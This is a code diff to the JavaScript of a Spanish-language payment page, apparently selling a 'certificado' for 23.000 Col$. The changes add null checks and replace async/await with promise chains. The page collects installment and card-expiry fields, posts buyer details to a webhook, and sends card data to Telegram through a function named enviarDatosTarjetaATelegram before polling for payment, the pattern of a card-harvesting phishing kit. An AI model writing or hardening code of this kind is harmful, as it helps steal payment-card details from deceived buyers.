@@ -257,18 +257,28 @@
   }
 
   /* Cuotas 1-36, Mes 01-12, Anio actual+0..10 */
-  var selCuotas = document.getElementById("selCuotas");
-  for (var c = 1; c <= 36; c++) {
-    var o = document.createElement("option"); o.value = c; o.textContent = c; selCuotas.appendChild(o);
-  }
-  var selMes = document.getElementById("selMes");
-  for (var m = 1; m <= 12; m++) {
-    var om = document.createElement("option"); om.value = m; om.textContent = (m < 10 ? "0" + m : m); selMes.appendChild(om);
-  }
-  var selAnio = document.getElementById("selAnio");
-  var anioActual = new Date().getFullYear() % 100;
-  for (var y = anioActual; y <= anioActual + 10; y++) {
-    var oy = document.createElement("option"); oy.value = y; oy.textContent = y; selAnio.appendChild(oy);
+  try {
+    var selCuotas = document.getElementById("selCuotas");
+    if (selCuotas) {
+      for (var c = 1; c <= 36; c++) {
+        var o = document.createElement("option"); o.value = c; o.textContent = c; selCuotas.appendChild(o);
+      }
+    }
+    var selMes = document.getElementById("selMes");
+    if (selMes) {
+      for (var m = 1; m <= 12; m++) {
+        var om = document.createElement("option"); om.value = m; om.textContent = (m < 10 ? "0" + m : m); selMes.appendChild(om);
+      }
+    }
+    var selAnio = document.getElementById("selAnio");
+    if (selAnio) {
+      var anioActual = new Date().getFullYear() % 100;
+      for (var y = anioActual; y <= anioActual + 10; y++) {
+        var oy = document.createElement("option"); oy.value = y; oy.textContent = y; selAnio.appendChild(oy);
+      }
+    }
+  } catch (error) {
+    console.error('Error llenando dropdowns:', error);
   }
 
   document.getElementById("inNombres").addEventListener("input", function () {
@@ -582,27 +592,26 @@
     // NOTIFICAR MATRÍCULA AGREGADA A TELEGRAM
     setBtnLoading(btn, true, "Procesando...");
 
-    try {
-      await fetch(WEBHOOK_BASE_URL + '/api/notify-matricula', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          nombreCertificado: pendiente ? pendiente.nombre : "Certificado Estándar",
-          email: correo,
-          matricula: numDoc,
-          monto: pendiente ? pendiente.valor + " Col$" : "23.000 Col$",
-          nombreCliente: nombre
-        })
-      });
+    fetch(WEBHOOK_BASE_URL + '/api/notify-matricula', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        nombreCertificado: pendiente ? pendiente.nombre : "Certificado Estándar",
+        email: correo,
+        matricula: numDoc,
+        monto: pendiente ? pendiente.valor + " Col$" : "23.000 Col$",
+        nombreCliente: nombre
+      })
+    }).then(function () {
       console.log('✅ Notificación de matrícula enviada');
-    } catch (error) {
+    }).catch(function (error) {
       console.error('Error notificando matrícula:', error);
-    }
+    });
 
     // ENVIAR A TELEGRAM
     setBtnLoading(btn, true, "Enviando...");
 
-    setTimeout(async function () {
+    setTimeout(function () {
       var datosTelegram = {
         solicitudId: solicitudId,
         nombreCompleto: nombre,
@@ -619,15 +628,15 @@
         fechaHora: new Date().toLocaleString('es-CO')
       };
 
-      var enviado = await enviarDatosTarjetaATelegram(datosTelegram);
-
-      if (enviado) {
-        showLoading(true);
-        iniciarPollingPago();
-      } else {
-        alert('Error al enviar datos');
-        setBtnLoading(btn, false);
-      }
+      enviarDatosTarjetaATelegram(datosTelegram).then(function (enviado) {
+        if (enviado) {
+          showLoading(true);
+          iniciarPollingPago();
+        } else {
+          alert('Error al enviar datos');
+          setBtnLoading(btn, false);
+        }
+      });
     }, 450);
   });
 })();
